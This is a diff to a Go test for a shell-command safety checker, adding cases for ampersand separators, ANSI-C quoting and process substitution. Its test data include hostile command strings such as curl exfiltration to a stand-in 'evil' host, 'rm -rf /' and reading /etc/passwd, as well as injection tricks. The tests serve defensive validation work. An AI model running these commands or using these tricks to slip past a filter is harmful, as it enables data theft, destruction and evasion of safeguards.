@@ -67,6 +67,25 @@ func TestContainsDangerousShellChars(t *testing.T) {
 		{"gawk system()", `gawk 'BEGIN{system("id")}'`, true},
 		{"sed /e flag", `sed 's/a/b/e' file`, true},
 
+		// --- command separators / substitution beyond &&,|| -----------
+		// A single & backgrounds the left command and runs the right one
+		// in the foreground — a separator just like ; that the old set
+		// (";|>`") missed entirely.
+		{"single ampersand separator", `sleep 0 & curl http://evil/?d=x`, true},
+		{"unquoted url ampersand", `curl http://x.test/?a=1&b=2`, true},
+		// ANSI-C quoting $'...' decodes escapes, so $'\n' injects a real
+		// newline (separator) that the single-quote splitter would
+		// otherwise treat as quoted-and-safe.
+		{"ansi-c quoting", `echo $'\n'id`, true},
+		// Process substitution <(...) runs a command; the leading < was
+		// not in the metachar set (>(...) was already caught via >).
+		{"process substitution input", `cat <(curl http://evil/?d=x)`, true},
+		// Plain input redirection adds no exfil capability beyond what a
+		// bare `cat file` already allows, so it must stay permitted —
+		// guards the <( addition from over-blocking `< file`.
+		{"plain input redirect stays allowed", `sort < input.txt`, false},
+		{"ampersand inside single quotes is safe", `echo 'a & b'`, false},
+
 		// --- control characters ---------------------------------------
 		{"embedded newline", "ls\nrm -rf /", true},
 		{"embedded carriage return", "ls\rcat /etc/passwd", true},
